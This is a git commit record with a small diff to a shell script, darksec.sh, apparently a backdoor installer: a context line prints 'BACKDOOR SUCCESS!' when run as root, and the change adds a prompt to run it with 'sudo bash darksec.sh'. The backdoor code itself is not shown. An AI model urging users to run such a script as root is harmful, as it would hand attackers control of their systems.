604550fe0cac6f58147c3d1712562291774b7216
DARKSEC <121623691+DARKSECshell@users.noreply.github.com>
2024-02-11 13:18:25 -0300

    darksec.sh

--- darksec.sh
+++ darksec.sh
@@ -31,5 +31,5 @@ if [ $(/usr/bin/whoami) == "root" ]; then
 	echo "[+] COMPLETED HAPPY HACKING, BACKDOOR SUCCESS!"
 
 else
-	echo "You not root, run with root"
+	echo "You not root, run with root --> sudo bash darksec.sh"
 fi
